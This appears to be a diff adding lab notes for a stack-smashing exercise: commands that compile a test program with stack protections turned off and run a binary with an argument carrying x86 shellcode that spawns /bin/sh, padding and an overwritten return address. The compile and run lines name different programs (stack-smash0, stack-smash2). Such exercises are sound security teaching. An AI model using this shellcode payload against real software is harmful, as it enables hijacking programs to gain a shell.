@@ -1,0 +1,5 @@
+sudo yum install glibc-devel.i686
+
+gcc -Wall -m32 -fno-pic -no-pie -fno-stack-protector stack-smash0.c -o stack-smash0
+
+./stack-smash2 `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAA\xbc\xcf\xff\xff"`
